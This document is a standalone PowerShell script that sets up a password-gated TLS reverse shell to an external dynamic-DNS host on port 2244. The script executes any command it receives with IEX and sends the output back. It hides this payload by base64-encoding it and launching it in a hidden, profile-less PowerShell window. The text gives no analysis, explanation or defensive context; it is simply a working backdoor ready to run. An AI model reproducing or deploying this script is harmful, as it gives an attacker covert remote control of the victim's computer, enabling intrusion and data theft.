$code = '$IP="x86david.ddns.net"; $P=2244; $pw="password"; $cb={$true}; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine("READY"); if($r.ReadLine().Trim() -eq $pw){ while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $w.Flush(); $t=""; while($c.Connected){ $k=$r.Read(); if($k -eq 13 -or $k -eq 10 -or $k -eq -1){break} if($k -eq 8 -or $k -eq 127){ if($t.Length -gt 0){ $t=$t.Substring(0,$t.Length-1); $w.Write("`b `b"); $w.Flush() } continue } $char=[char]$k; $t+=$char; $w.Write($char); $w.Flush() } if($t.Trim().Length -gt 0){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write("`r`n"+$o) }catch{ $w.Write("`r`n"+$_.Exception.Message) } } } } $c.Close() } catch { }'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($code); $enc = [Convert]::ToBase64String($bytes); Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -EncodedCommand $enc" -WindowStyle Hidden; exit
